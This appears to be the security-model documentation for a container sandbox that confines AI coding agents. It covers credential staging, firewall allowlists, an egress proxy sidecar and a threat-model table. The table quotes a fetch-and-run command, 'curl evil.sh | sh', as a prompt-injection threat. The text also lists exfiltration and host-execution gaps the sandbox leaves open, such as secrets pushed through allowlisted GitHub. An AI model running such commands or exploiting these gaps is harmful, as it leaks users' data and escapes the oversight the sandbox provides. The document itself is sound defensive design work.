# Security Model

## Generated files

Repository contents are untrusted when the host generates sandbox files. Before
generation, the CLI checks managed directories under `.project-sandbox` and
`.devcontainer`. Every write and cleanup operation also opens parent directories
component by component with `O_NOFOLLOW` and operates relative to those open
descriptors. A directory swapped for a symlink after validation cannot redirect
the operation to its target. Symlinked directory components are refused, except
for macOS's system `/tmp`, `/var`, and `/etc` aliases.

Dockerfiles, scripts, agent settings, certificates, cache records, prompts, and
devcontainer JSON are written to fresh files and atomically renamed into place.
Existing output symlinks (including dangling links) and hard links are replaced
without changing their targets or their targets' permissions. Script permissions
are set through the open file descriptor before publication. Configs containing
proxy keys are created privately and published with mode `0600`. Intentional
relative symlinks in `.devcontainer` are still generated.

The root `.gitignore` must be read to preserve existing entries, so a symlink there
is rejected instead of replaced. Session logs use a fresh `0600` file and keep its
descriptor open while streaming; transcripts and JSON summaries use safe
replacement too. Stale certificates and project credential remnants are removed
relative to verified directories, with symlink-resistant recursive cleanup.
Dry-runs do not perform these mutations.

These protections prevent redirected host writes. Separately, CLI invocations
hold a context lock from rendering through image selection and pin the image
selected for launch. See [concurrent builds](concurrent-builds.md) for cache
identity checks, serialization, and the external-builder boundary.

## Implicit history and mask mounts

Shell history, Claude conversation history, and empty workspace masks are stored
under `$XDG_STATE_HOME/project-sandbox/mounts` (default
`~/.local/state/project-sandbox/mounts`). A hash of the canonical project path
separates projects. Repository-local `.project-sandbox/history` and
`.project-sandbox/workspace-mask` paths are no longer used as mount sources.

The host opens each storage directory with `O_NOFOLLOW`, verifies ownership and
permissions, and refuses unexpected entries instead of chmodding them into
compliance. Private parents and history roots are owned by the invoking user
with mode `0700`; ancestors must not be writable by other users, except for
root-owned sticky temporary directories. Empty mask leaves use mode `0755` and
are mounted read-only. Only the leaf history and mask directories are mounted;
their parents remain outside the sandbox, so an agent cannot replace a source
directory between validation and the runtime's path lookup. History contents
remain agent-writable and are never traversed or rewritten by host setup.

The storage tree must not overlap the checkout, a worktree, build context, or
another mounted source. Explicit mounts of the storage tree, its ancestors, or
its descendants are refused, even when read-only. Only fully understood bind
mount options are accepted here; known bind propagation, recursion, and consistency
options retain their runtime semantics while their sources are checked. Ambiguous
and unmodeled passthrough forms fail closed. See [mount validation](egress-sidecar.md#extra-mount-validation). A fresh CLI mask belongs to one session and is removed on normal or
exceptional teardown without deleting other sessions' masks or history.

Generated devcontainers retain a private empty mask and run a standalone helper
from protected host storage before each creation. The helper uses an absolute
Python interpreter with `-I -S`, imports only the standard library, and validates
sources again. It refuses substituted directories, nonempty masks, extra mounts
redirected into protected storage, and relocated workspaces. The interpreter and
its base installation must also remain outside exposed paths. Missing history
or mask directories are recreated; unexpected ownership or permissions cause
startup to fail. If the helper itself is missing, regenerate the configuration.

These controls address repository and sandbox modification of implicit mount
sources. They do not isolate state from an independently malicious host process
running as the same user or as root. Devcontainer configuration itself is
host-executable configuration and must be trusted before opening it.

## Credential Isolation

Direct named-agent runs forward only the selected agent's staged credentials:
Claude receives Claude credentials, Codex receives Codex credentials, OpenCode
receives OpenCode credentials, Pi receives Pi credentials, and Copilot receives
only its GitHub token. The same rule
applies to headless modes. Provisioning is presence-driven, so credential files
are created in the container home only when the corresponding read-only secret
mount was authorized and supplied.

`--agent bash` is intentionally a multi-agent environment: every detected
supported agent credential is mounted and can be read by any process in that
session. The one exception is the Copilot token, which is never mounted into a
bash session (see [GitHub Copilot token](#github-copilot-token)). Generated devcontainers are also intentionally multi-agent and receive
all detected forwarded credentials. Use `--no-forward-credentials` when a bash
session or devcontainer should start unauthenticated.

CLI credentials use [private session inputs](#private-session-inputs).
Persistent devcontainer credentials remain under `/tmp/project-sandbox-<uid>/...`.
Neither root is mounted as a whole. Individual authorized credential directories
are mounted at `/project-sandbox-secrets/<agent>`; credentials never enter the
checkout or image build context. Extra mounts that expose private CLI session
storage are rejected.

## Private session inputs

Each CLI session exclusively creates a random directory under
`$XDG_STATE_HOME/project-sandbox/session-inputs` (default
`~/.local/state/project-sandbox/session-inputs`). Ownership and permissions are
validated through no-follow directory traversal. The root and session directory
are private (`0700`); token, API environment, and prompt files use `0600`.

Agent configs, forwarded credentials, Copilot tokens, proxy provider keys, and
prompts are staged there. Only the required subdirectories are mounted, read-only;
the session tree is never a workspace or build context. Chroot sessions also
keep their launcher and jail in this directory. Each session removes only its
own tree on exit, including handled interrupts and startup failures. SIGKILL or
a host crash can leave files behind; orphan cleanup must account for live
containers and remains follow-up work.

CLI launches neither refresh nor purge persistent devcontainer credential
staging. Use generation without `--agent` or a prompt (or `--build-only`) to
refresh those credentials before reopening a devcontainer. Regenerating a live,
externally managed devcontainer remains a separate lifecycle operation.
`--no-forward-credentials` skips copying and mounting credentials; it does not
delete inputs owned by another CLI session or persistent devcontainer.

Claude's forwarded files are its OAuth credentials (`~/.claude/.credentials.json`
or the macOS Keychain entry), a sanitized `~/.claude.json`, and, when present,
`~/.claude/remote-settings-consent.json`. The consent file records that the host
user accepted their organization's server-managed settings. Forwarding it means
a sandboxed Claude session can skip the managed settings dialog for those same
settings. If they change, Claude Code prompts again inside the container.

## GitHub Copilot token

`--agent copilot` authenticates with a GitHub token rather than an agent-specific
credential file. The token is resolved on the host at every launch (see
[usage](usage.md#github-copilot)), so there is no OAuth refresh or expiry
tracking for Copilot.

- **Scope.** The preferred source is a fine-grained PAT in pass with only the
  "Copilot Requests" permission: it can call Copilot and nothing else. The
  fallback, `gh auth token`, returns the GitHub CLI's token, which commonly has
  `repo` and `workflow` scope. While GitHub is reachable (Copilot implies
  `--allow-github`), an agent or a prompt injection holding that token could
  push branches, edit workflows, or read private repositories. Every run that
  falls back to `gh` prints a `[W]` warning naming the pass entry to fill.
  Classic `ghp_` tokens are rejected.
- **Where it lives.** The token is written to a 0600 file in a 0700 directory
  in its private session input tree (outside the repository, unique to the
  launch, removed at session end) and mounted read-only at
  `/project-sandbox-secrets/copilot` only when Copilot is the selected agent. It
  is never baked into the image, written into generated project files, passed
  in argv, or copied into `$COPILOT_HOME`. Resolved tokens are redacted from
  headless session logs and live output.
- **Who can read it.** The entrypoint exports `COPILOT_GITHUB_TOKEN` only for
  the Copilot process. That process environment is inherited by the shell
  tools Copilot runs, so anything Copilot executes can read the token. This is
  inherent to how Copilot CLI reads tokens; a plaintext token file in
  `$COPILOT_HOME` would be no better. The PAT path limits what a leaked token
  can do. Bash sessions and other agents never receive it.
- **Built-in MCP servers are disabled** (`--disable-builtin-mcps`), because the
  built-in GitHub MCP server would use the same token to act on GitHub.

## Unsupervised session history

A run with `--prompt` or `--prompt-text` is unsupervised. These runs retain the
agent settings needed to execute the task, but omit persistent shell history
and Claude conversation-history mounts. OpenCode staging keeps its
`opencode.json` / `opencode.jsonc` configuration and only the provider credentials
in `.local/share/opencode/auth.json`; it excludes session databases, logs,
caches, and all `.local/state/opencode` files. This authentication file location
is documented in [OpenCode's provider guide](https://opencode.ai/docs/providers/).
OpenCode configuration entries must be files; directories with those names are
not recursively staged. Staging is cleared before each sync. Unsupervised
OpenCode credentials use a separate host staging directory, so a later interactive
run cannot add history to an unsupervised container's credential mount.
Codex and Pi also stage only credential files; a directory named `auth.json`
is never copied recursively. Prompt mounts expose only the current staged file,
so older files in the prompt staging directory remain hidden.
Interactive runs continue to forward OpenCode's data and state.
Generated devcontainers use the credentials staged by the generating invocation.

In every mode, `/workspace/.project-sandbox` is masked with an empty read-only
mount, hiding generated host configuration and host session logs. Project files
and explicitly requested extra mounts remain accessible; history stored there
is outside this automatic isolation.

## OAuth Token Lifetime

Agent OAuth access tokens are short-lived and the refresh tokens that renew them
are single-use. If an agent refreshed its token inside the `--rm` container, the
rotated token would be discarded on exit, logging the host out, and parallel
containers sharing one host login would race on the single-use refresh token and
invalidate each other. Two host-side measures keep the in-container token valid
for as long as possible and make any shortfall visible:

- **Host pre-launch refresh.** Before staging, `project-sandbox` runs the agent's
  own CLI on the host (`claude auth status` / `codex login status`) so the tool
  refreshes and persists its token using its own maintained logic; the refreshed
  credential is then staged, so the container starts with a near-full window.
  This runs under a per-agent lock, is best-effort, and is skipped with
  `--no-token-refresh`. OpenCode and Pi have no delegated refresh.
- **Start-of-session warning.** When credentials are forwarded, the launch prints
  the remaining lifetime of the staged token (`claudeAiOauth.expiresAt` for
  Claude; the `exp` claim of the Codex access-token JWT). If the session outlives
  it, the in-container agent refreshes the token using the host's single-use
  refresh token. The session keeps working, but that rotation invalidates the
  host login, so you need to re-authenticate on the host and re-run to re-stage
  afterward. Sessions are not killed at the deadline. For OpenCode, the
  soonest-expiring OAuth provider in its `auth.json` is used; long-lived/API-key
  providers carry no host-logout risk and show no warning. Pi's `auth.json`
  shape is not yet parsed by this check (deferred; see `TODO.md`), so no
  expiry warning is shown for Pi and the in-container agent's own refresh
  behavior applies.
- `--no-forward-credentials` starts the container unauthenticated. Host
  credentials are not read, staged, or mounted; other sessions' and persistent
  devcontainer inputs are preserved, and the generated
  `devcontainer.json` is rendered credential-free. It also disables the host
  refresh and start-of-session warning. Direct CLI runs may opt in to API-key
  environment injection with `--api-key-env NAME` or `--api-key-env-file FILE`;
  dry-runs redact values, but real runs still pass those values through the
  runtime process environment.

OpenCode and Pi can each be configured with multiple providers (BYOK). The
default firewall allows OpenAI and Anthropic endpoints; use `--allow-github`
for GitHub Copilot, or `--extra-domain DOMAIN` for another provider endpoint.
Selecting `--agent pi` (or `opencode`) with the firewall enabled prints a
warning to this effect. Pi also has no built-in permission/confirmation
system, so headless runs always pass `--approve`, trusting the project-local
`.pi/` config for that run; the container's firewall and filesystem
boundaries remain the safety net, consistent with Pi's own "run in a
container" guidance.

## VCS metadata access

`--vcs-access full` is the default and exposes Git/jj metadata read-write.
Select `read-only` or `hidden` to protect existing metadata from the session;
see [VCS access](vcs-access.md) for supported layouts. These modes do not provide
an immutable snapshot against other host processes or concurrent full sessions.

Source files remain writable in restricted modes. An agent can edit tracked
`.gitattributes` to select an existing configured filter, or edit a workspace
script referenced by trusted hook/filter configuration. Automatic host-side
`git add` and `git commit` during branch finalization can still execute that
code. Restricted metadata therefore does not establish a complete host-execution
boundary. Without `--branch`, no automatic capture occurs; review these changes
before running host VCS commands.

Changing the full-access default and isolating host capture/import are deferred
in the [VCS roadmap](../ROADMAP.md#vcs-defaults-and-isolated-host-capture).

## Network Firewall

Firewall initialization is a one-time operation per container. The root-owned
script runs from `/` with a fixed system `PATH` and isolated Python helpers
(`python3 -I`). An atomic guard in `/run` rejects concurrent or repeated
attempts, including after a failed initialization. After installing and checking
the policy, the script removes its dedicated passwordless sudo entry before
reporting success. The script remains executable only by root.

Direct CLI sessions already use fresh containers with `--rm`. Do not restart a
previously initialized container: create a fresh one from the image. For
devcontainers, rebuild/recreate the container instead of restarting it. A failed
initialization also requires a fresh container. This prevents agent-triggered
reinitialization; it does not make the initial rule installation atomic or change
the treatment of established connections.

When the firewall is enabled by default, `init-firewall.sh` runs as root inside
the container and:

- Sets `iptables` and `ip6tables` policies to DROP.
- Pre-resolves allowlisted domains using the resolvers in `/etc/resolv.conf`,
  pins the resulting addresses into `/etc/hosts` and `ipset`, then blocks
  general outbound DNS to close DNS-tunnel exfiltration.
- Allows Claude/Anthropic endpoints (`api.anthropic.com`, `claude.ai`,
  `code.claude.com`, `platform.claude.com`), `api.openai.com`,
  `auth.openai.com`, and `chatgpt.com`.
- When `--allow-github` is set, also allows GitHub's published web/API/git IP
  ranges and DNS-pinned GitHub/Copilot hosts, including `github.com`,
  `api.github.com`, `uploads.github.com`, `codeload.github.com`,
  `lfs.github.com`, `raw.githubusercontent.com`, `objects.githubusercontent.com`,
  `github-cloud.githubusercontent.com`, `api.githubcopilot.com`,
  `api.individual.githubcopilot.com`, `api.business.githubcopilot.com`,
  `api.enterprise.githubcopilot.com`, `copilot-proxy.githubusercontent.com`,
  `origin-tracker.githubusercontent.com`, `copilot-telemetry.githubusercontent.com`,
  `collector.github.com`, and `default.exp-tas.com`.
- `--agent copilot` implies `--allow-github`. GitHub network access is enabled
  only by that flag or by selecting Copilot, never by prompt text: earlier
  releases opened it for `--agent bash` prompts whose first word was `copilot`.
- With `--agent copilot --copilot-host <tenant>.ghe.com`, the sandbox script
  also DNS-pins the tenant's hosts: `<tenant>.ghe.com`, `api.<tenant>.ghe.com`,
  `copilot-api.<tenant>.ghe.com`, and `copilot-telemetry-service.<tenant>.ghe.com`.
  GitHub's allowlist reference lists `*.<tenant>.ghe.com`, which a per-IP
  firewall cannot express, so these are the concrete names Copilot CLI uses; add
  any missing one with `--extra-domain`. The devcontainer firewall variant never
  includes them.
- In the devcontainer firewall variant only, allows the host gateway address so
  port-forwarding and IDE attach work. Direct CLI runs omit this host-network
  allowlist.
- When `--pi-ollama` is set, both firewall variants additionally allow outbound
  TCP to the runtime-adapter-selected host endpoint restricted to port `11434`
  (Ollama's default port) — narrower than the devcontainer's all-ports gateway
  rule above. The endpoint is exposed only through the runtime-private native
  mapping or exact Linux bridge listener, but other peers able to reach that
  private runtime network remain in the trust boundary. The fixed hostname is
  pinned where the runtime permits it.
- Rootless Podman on Linux with pasta runs every build and session with its own
  address, `198.18.0.2/24` with gateway `198.18.0.1` (`-a`, `-n`, `-g`), instead
  of pasta's default copy of the host's addresses. Without it, a proxy or
  gateway on the host's own LAN address is unreachable. The range is reserved
  for benchmarking (RFC 2544); a real network in `198.18.0.0/24` is shadowed.
  The gateway does not map to host loopback, and podman's
  `host.containers.internal` (`169.254.1.2`) does not answer in this mode. The
  host's own IPv6 addresses are still copied and remain unreachable.
- Rootless Podman on Linux with pasta forwards each planned host-local service
  port (`-T <port>:<port>`) from the container's loopback to the same port on
  host loopback, IPv4 only (`-4`). The sandbox firewall accepts all loopback
  traffic, so that port list, built from exactly the planned services, is the
  boundary: no other host-loopback port is reachable. A sandbox process
  listening on a forwarded port inside the container conflicts with the forward.
  Services listening only on IPv6 loopback are rejected on this path.
- Ollama itself stays on host loopback. On local Linux bridge modes (Docker
  Engine) a project-sandbox forwarder is bound to the exact validated bridge
  address and port and forwards only to the one recorded loopback address on
  that port. It is shared by the concurrent sessions that use the service, each
  holding a `flock` lease, and exits within about one poll interval (2s) after
  the last lease is released, including a lease released by a killed session.
  A listener owned by another process is refused, never reused, and there is no
  fallback port or wildcard address. Its state is private to the user
  (`$XDG_STATE_HOME/project-sandbox/local-forward/`, directories `0700`, files
  `0600`, symlinks refused). Apple `container` requires the administrator-managed
  `host.docker.internal` localhost DNS mapping described in `docs/usage.md`.
  Creating it can disrupt container Internet access until runtime networking is
  rebuilt and might disable Private Relay, so restart the container system
  immediately afterward.
- Mirrors the IPv4 allowlist into a parallel IPv6 set; falls back to disabling
  IPv6 via `sysctl` when `ip6_tables` is unavailable. The script exits with an
  error if both `ip6tables` and `sysctl` are unavailable.

Domain allowlists are resolved once when the container starts, then pinned as IP
addresses in `ipset`. CDN-backed services can rotate IPs during long sessions; if
an allowlisted service starts failing after it initially worked, create a fresh
container (rebuild/recreate a devcontainer) so the firewall resolves fresh addresses.

Customize:

- `--extra-domain DOMAIN` appends entries to the allowlist, such as
  `registry.npmjs.org`, private registries, or internal APIs. Repeatable.
- `--allow-github` allows GitHub and GitHub Copilot endpoints. This is useful for
  GitHub-backed workflows, but it also creates a viable exfiltration path through
  GitHub.
- `--no-firewall` skips the firewall entirely. Use it only for trusted-network
  debugging.
- `--pi-ollama` (with `--agent pi`) allows the host's Ollama port through the
  selected runtime-private endpoint and bakes Pi's provider config to use it;
  see `docs/usage.md` for the runtime matrix and Apple setup. `--ollama-model` overrides the
  default model list.

## Node.js + npm images (`--node-npm`)

`--node-npm` generates an image with more third-party code than the other flows:

- **Image contents:** a `debian:trixie-slim` base with the usual sandbox
  tooling, Debian `chromium`, fontconfig, `fonts-liberation`,
  `fonts-noto-color-emoji`, the project's npm dependencies in
  `/opt/node-project/node_modules`, and, when the lockfile contains Playwright,
  Playwright's Chromium in `/opt/ms-playwright` plus the Debian packages its
  `install --with-deps` pulls in. Both `/opt` trees are owned by the agent user.
  This adds several hundred MB to the image.
- **Install scripts run at build time.** `npm ci` executes dependency lifecycle
  scripts (`preinstall`, `install`, `postinstall`) as root during the image
  build, with unrestricted network access; Playwright's browser download runs
  there too. The build has no access to agent credentials or the workspace
  beyond the copied manifests, but a malicious package can tamper with the
  image, and the agent then runs inside that image with the workspace and any
  forwarded credentials mounted. Supply-chain risk is managed through the
  committed lockfile: review lockfile changes and pin versions. The sandbox never runs
  `npm install` for you at runtime (the firewall blocks the registry anyway).
- **Chromium `--no-sandbox`.** Chromium's own sandbox needs user namespaces or a
  setuid helper, which are unavailable to the non-root agent user in the
  container, so browsers must be launched with `--no-sandbox` (Playwright does
  this by default). The container (and, on Apple `container`, the VM) is the
  isolation layer for pages the browser loads; do not point the browser at
  untrusted sites you would not let the agent itself fetch.
- **Runtime `node_modules`.** `/workspace/node_modules` is a tmpfs populated from
  the image, so host-platform binaries in the host's `node_modules` are never
  executed, and changes the agent makes there never reach the host. The
  entrypoint requires a separate tmpfs mount at that exact path and rejects
  symlinks, then copies only when the mount is empty. A plain directory on a
  tmpfs-backed host filesystem does not qualify. If the mount is absent or has
  the wrong filesystem type, the session fails before copying or starting the
  agent.
- **Memory.** The tmpfs and the default `2g` `/dev/shm` count against the
  container's `--memory` limit.

## Threat Model

| Threat | Mitigation |
|---|---|
| Agent reads `~/.ssh`, `~/Library`, etc. | Arbitrary host home directories are not mounted by default. Apple `container` adds a VM boundary; Docker/Podman rely on the host's container isolation. |
| Agent deletes the wrong project directory | The workspace, generated config, staged agent credentials, optional `--mount` entries, and worktree-mode `.git` metadata are the intentional host mounts; everything else lives in the disposable container or VM. |
| Agent exfiltrates the workspace to an arbitrary server | iptables egress allowlist with default DROP and domain whitelist for both IPv4 and IPv6. |
| DNS tunneling exfiltration | Allowlisted domains are pre-resolved at startup and general outbound DNS is blocked afterward. |
| Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
| Malicious npm post-install scripts | Run as the unprivileged `agent` user (host-matched for Docker/Podman on Linux); no access to unmounted host paths. |
| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` for Claude and `check_for_update_on_startup = false` for Codex; `PI_SKIP_VERSION_CHECK=1` for Pi. OpenCode config is not currently sanitized; see `TODO.md`. |
| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` for Claude; `analytics.enabled = false` and `feedback.enabled = false` for Codex; `PI_OFFLINE=1` for Pi (disables startup update/telemetry network calls); `OPENSPEC_TELEMETRY=0` for OpenSpec. OpenCode config is not currently filtered for telemetry settings; see `TODO.md`. |
| API token leakage via process environment | Default forwarded agent tokens are passed through mounted credential files, not environment variables; CLI staging files are kept in private per-session storage. Explicit `--api-key-env*` injection is opt-in, requires `--no-forward-credentials`, and redacts dry-run output, but the selected keys are still present in the runtime process environment during real runs. |
| Agent rewrites the project `--dockerfile` to poison the next build | The project Dockerfile's SHA256 is recorded under the masked `.project-sandbox/.dockerfile-checksums.json`, which the sandbox cannot read or modify; a later run warns when the Dockerfile changed since it was last built. |
| Agent reads or edits `.devcontainer` host-path mounts and config | `/workspace/.devcontainer` is masked with an empty read-only mount in both direct runs and devcontainers. |

The tool does not protect against:

- Exfiltration via whitelisted endpoints, such as committing secrets to a GitHub
  repo.
- Misuse of an agent's own API token, which is by definition available to the
  agent.
- IPv6 egress when `ip6_tables` is unavailable and `sysctl` cannot disable IPv6;
  the firewall script exits with an error in that case rather than silently
  proceeding.

## Troubleshooting

- **No supported runtime found.** Install Apple `container` on macOS, or
  Docker/Podman on Linux. You can also pass `--runtime docker`,
  `--runtime podman`, or `--runtime apple-container` explicitly.
- **`container system start` failed.** Make sure macOS 15+ is current and
  `apple/container` is installed; the tool calls `container system start`
  idempotently before building when the Apple runtime is selected.
- **Build OOM on Apple `container`.** The builder VM is separate from run VMs.
  Bump it with `container builder start --memory 8g --cpus 8`, then re-run
  `project-sandbox`.
- **Stale image after an out-of-band change.** Builds are skipped when the
  generated inputs are unchanged and the image still exists; the decision uses a
  fingerprint recorded in `.project-sandbox/.build-state.json` (a non-sensitive
  tag + hash). If the image was modified outside project-sandbox, pass
  `--force-build` to rebuild.
- **Host service times out on Apple `container`.** A curl timeout (rather than
  a refusal) reaching the agent proxy, Internet proxy, or Ollama means the
  `host.docker.internal` localhost DNS domain resolves but no longer redirects.
  Delete the domain, re-create it, and restart the container system; see
  [Apple container host alias](apple-container-dns.md).
- **GitHub meta API timeout.** The firewall script falls back to an empty
  `{web,api,git,ipv6}` set and starts with a partial allowlist. Re-running the
  agent later will retry.
- **`ip6tables` unavailable.** The script attempts
  `sysctl net.ipv6.conf.all.disable_ipv6=1` first. If that also fails, the script
  aborts with an error.
- **Credentials look stale.** Re-run `project-sandbox` on the host to refresh the
  `/tmp` credential staging directory from the host agent config or macOS
  Keychain. The CLI also refreshes a near-expiry host Claude token before staging
  unless `--no-token-refresh` is set.
- **Env vars in `vminitd.log`.** apple/container logs the full process
  environment. Default forwarded agent tokens are passed through mounted
  credential files only; identity env vars are low-sensitivity. Values injected
  with `--api-key-env` or `--api-key-env-file` are process environment secrets
  and may appear in runtime metadata or logs.
- **Rootless Podman firewall setup fails.** The default firewall needs
  `NET_ADMIN` and `NET_RAW`. Use a Podman setup that permits those capabilities,
  or pass `--no-firewall` only for trusted-network debugging.

## Limitations

- Dockerfiles passed with `--dockerfile` must use the default backslash (`\\`)
  line-continuation escape. The Dockerfile parser directive ``# escape=` `` is
  not currently honored, so backtick-continued instructions may produce an
  invalid generated Dockerfile.
- Base images, including the final stage of a Dockerfile passed with
  `--dockerfile`, must be Debian or Ubuntu based. The firewall depends on `apt`
  packages including `aggregate`, which Alpine does not ship.
- Direct Python CLI runs support Apple `container`, Docker, and Podman.
  Docker/Podman provide container isolation rather than the Apple MicroVM
  boundary. Incus is a future backend candidate, but it has a different
  image/import and launch lifecycle from the generated Dockerfile flow used here.
- The generated `.devcontainer/` targets local Docker-compatible runtimes such as
  Docker Desktop or OrbStack; remote services may require rewriting local mounts
  and relaxing or replacing firewall capability requirements.
- `--branch` creates an isolated workspace for the agent. In git repos it creates
  (or reuses) a git worktree on the given branch, mounts the worktree at
  `/workspace`, and bind-mounts the main repo's `.git/` so `git` works correctly
  inside the container. In jj repos it creates (or reuses) a jj workspace plus
  bookmark, mounts that workspace at `/workspace`, and bind-mounts the main repo's
  `.jj/` metadata so `jj` works inside the container. Worktree-of-worktree setups
  are not supported.
- After the session there is a single, non-integrating action: the agent's work
  is captured on the branch/bookmark (any uncommitted changes are committed for
  git; the working copy is snapshotted and the bookmark advanced to the session
  tip for jj), and the worktree/workspace is removed. Nothing is ever merged, rebased, or
  pushed into the main checkout — the branch/bookmark holds the work for you to
  integrate manually. `--keep-workspace` leaves the worktree/workspace in place so
  a later `--branch <same>` run reuses it; a failed session is also left in place
  for inspection.
- `--branch-start-at <revision>` pins the starting commit/tag/branch/bookmark for
  a **new** branch created by `--branch`. It errors if the branch/bookmark already
  exists (delete or merge it first, or omit the flag to reuse the existing one).
- `jj` is installed in the container and configured with the same global
  name/email identity passed to Git.
# Agent gateway boundary

Proxy mode provides provider-credential isolation, not immunity from local
spend. OpenAI/Anthropic keys and host OAuth state are excluded, but the agent
VM receives the gateway bearer key and can spend through the reachable local
gateway during its session. Pi/OpenCode generated config and Apple `container`'s
Bash env file are mode 0600, scoped to the selected session, redacted from
diagnostics, and removed after use. Docker/Podman Bash sessions inherit only
bare environment names through argv; values travel in the protected subprocess
environment.
Because Bash can launch either bundled agent, Bash proxy sessions mount private
Pi and OpenCode proxy configs in addition to the `OPENAI_*` environment. Both
configs contain the same gateway key, are mode 0600 before mounting, and are
removed from staging after the session.

Proxy-mode egress is gateway-only by default: normal OpenAI/Anthropic domains
and the devcontainer's broad host-gateway exception are omitted. The exact
forwarded gateway address and TCP port remain allowed. Only explicit
`--extra-domain` and `--allow-github` options widen that policy.

Loopback publishing is not a confinement boundary, particularly with Apple
`container` vmnet. Keep the gateway's strict listener authentication enabled
and never expose an unauthenticated listener. The external gateway's SQLite
request log can contain complete prompts and responses; follow its retention,
inspection, and pruning guidance before using sensitive material.

## Remote proxy endpoints

Agent and Internet proxies can independently use HTTP loopback forwarding or
direct remote HTTP/HTTPS. Internet mode retains default-deny IPv4/IPv6 and
blocks general DNS, direct provider access, and broad gateway exceptions. Each
endpoint is resolved with sandbox-visible DNS before closure, validated, and
pinned for the session with exact TCP address/port permissions. Restart after
DNS rotation. A hostname resolving to loopback, multicast, or an unspecified
address aborts startup. IPv6 enforcement failures abort Internet mode.

An IP/port exception also permits another virtual host on that pair; it is not
an HTTP hostname policy. Verified TLS authenticates names for compliant clients.
Proxy environment variables supply routing hints; removing them does not widen
the firewall. Gateway and Ollama requests bypass the Internet proxy and keep
independent permissions. Agent-only `--no-firewall` provides neither pinning nor
egress enforcement. Operators must provide sandbox reachability to endpoints.

Supplied public CAs extend per-connection host trust and rebuilt image-wide
trust. They never change the host trust store. HTTPS gateway discovery ignores
ambient proxies and follows no redirects, keeping the bearer key on the configured
origin. Internet proxy authentication and client certificates are unsupported;
HTTP 407 does not trigger credential acquisition or direct fallback. See
[proxy endpoints](proxy-endpoints.md) for TLS scope and client limitations.

## Egress sidecar

`--egress sidecar` replaces IP pinning with one global Squid sidecar per
runtime that filters by hostname; see [Egress sidecar](egress-sidecar.md). The
parts that matter for security:

- **The sandbox firewall is the boundary.** A sidecar-mode sandbox runs on the
  runtime's default network and has a route to the network, exactly like a
  firewall-mode sandbox. What keeps it on the sidecar is its own firewall: the
  `internet-proxy` policy of `init-firewall.sh`, run as root before the agent
  starts. It sets `INPUT`, `FORWARD` and `OUTPUT` to default `DROP`, admits new
  outbound TCP only to the sidecar endpoint (`host.docker.internal` on
  `[egress.sidecar] port`, default 3129) and to this session's local services
  or remote agent proxy, drops DNS, and fails closed when it cannot enforce
  IPv6. The agent runs without root, so it cannot change those rules, and
  `--no-firewall` is rejected in this mode.
- **No routing isolation over firewall mode.** Sidecar mode filters by
  hostname, but it does not add network isolation beyond firewall mode: if the
  sandbox firewall failed, the sandbox could reach the network directly. Clients
  that ignore the proxy variables fail closed instead of going around the
  sidecar.
- **The port is open to the host.** The sidecar publishes its proxy on exactly
  one host address: `127.0.0.1`, or on Docker Engine the default bridge's
  gateway (for example `172.17.0.1`). Any process on the host can use it, and so
  can any container that can reach that address (on Apple `container`, every
  container that resolves the localhost alias; on rootless Podman, every
  container whose pasta network forwards the port). Those clients get only what
  `egress.toml` allows, and the sidecar CA is never given to them. Squid's
  `client` log field is therefore the runtime's port forwarder, not a sandbox
  (on rootless Podman it is the host's LAN address), and the session-end denial
  count covers every client.
- **Docker Engine: gateway listeners compared with `linux-bridge-forwarder`.**
  Firewall mode reaches a host-loopback service on Docker Engine through a
  shared project-sandbox forwarder bound to the `docker0` gateway, one per
  service port. Before share-local-service-forwarders this was a per-session
  `socat`, with the same exposure and a single session's lifetime. Sidecar mode
  adds two listeners on the same address:

  | Listener | Bound to | Lifetime | Who can connect | Reaches |
  |---|---|---|---|---|
  | `linux-bridge-forwarder` (firewall mode; Ollama, agent proxy in both modes) | `<gateway>:<service port>` | the union of the sessions that use it, plus about one poll interval (2s) | every container on any Docker bridge | the service on host loopback (one recorded loopback address), unfiltered |
  | Sidecar publish | `<gateway>:3129` | until `project-sandbox-egress down` | every container on any Docker bridge | Squid: only what `egress.toml` allows |
  | Parent forwarder (loopback parent only) | `<gateway>:<free port>` | the sidecar's | the sidecar's bridge address only; every other peer is closed before any upstream connection | the parent on `127.0.0.1:<parent port>` |

  A host listener on a bridge gateway is reachable from containers on every
  bridge, because traffic to a host address takes the host's INPUT path, which
  Docker's inter-bridge isolation does not filter. The sidecar publish is
  therefore exposed like a `linux-bridge-forwarder` listener, but longer-lived, and
  it grants less: a hostname-filtered proxy instead of a raw service. Source
  addresses are preserved on this path, so the forwarder's peer check reliably
  tells the sidecar apart from other containers. The forwarder connects only to
  host loopback on the parent's port, and sandboxes have no firewall rule for
  its port. A host firewall such as ufw may block these listeners; that case is
  untested.
- **One policy, out of reach.** The only policy is
  `$XDG_CONFIG_HOME/project-sandbox/egress.toml`. It and the sidecar state
  directory `$XDG_STATE_HOME/project-sandbox/egress/` (which holds the CA key)
  must lie outside the project, the worktree, `.git`/`.jj` and every `--mount`
  source. This is checked after resolving symlinks at every launch, so the
  agent can neither widen the policy nor read the key. Rendered Squid config
  lives in the state directory, never in the project. Every agent provider host
  is always allowed. A hand edit of `egress.toml` applies to running sandboxes
  at the next launch, `reload` or `allow` edit; that is intended.
- **Squid policy.** Squid refuses IP-literal destinations, CONNECTs to ports
  other than 443, tunnels whose TLS SNI is missing or differs from the CONNECT
  host, and non-TLS tunnels. In direct mode it also refuses names that resolve
  to private, loopback, link-local or metadata addresses. These denials happen
  before any upstream connection is made.
- **Sidecar CA.** The sidecar owns one CA per runtime: EC P-256, `pathlen:0`,
  with critical name constraints, valid for `[egress.ca] lifetime_days`
  (default 7 days, at most 30).
  - The constraint is `github.com` when the Copilot profile intercepts
    `api.github.com`. It cannot be narrower, because Squid mimics GitHub's
    `*.github.com` certificate names.
  - Otherwise the constraint is the reserved name `invalid`, and the CA is not
    mounted into any sandbox.
  - The key lives in `egress/<runtime>/sidecar/ca-key.pem`, mode 0600 in a
    0700 directory, written with `O_EXCL | O_NOFOLLOW`. It is mounted read-only
    into the sidecar only, never into a sandbox, and deleted by
    `project-sandbox-egress down` or when the CA is replaced. It lives as long
    as the sidecar keeps it, at most 30 days.
  - The CA is reused across restarts while it has at least 2 days left and its
    constraints match. While interception is active, launches warn within 2
    days of expiry and refuse to start once it has expired.
  - Only the public certificate enters a sandbox, through the read-only
    per-session mount `/project-sandbox-egress`, and it is installed at
    start-up, never baked into an image.
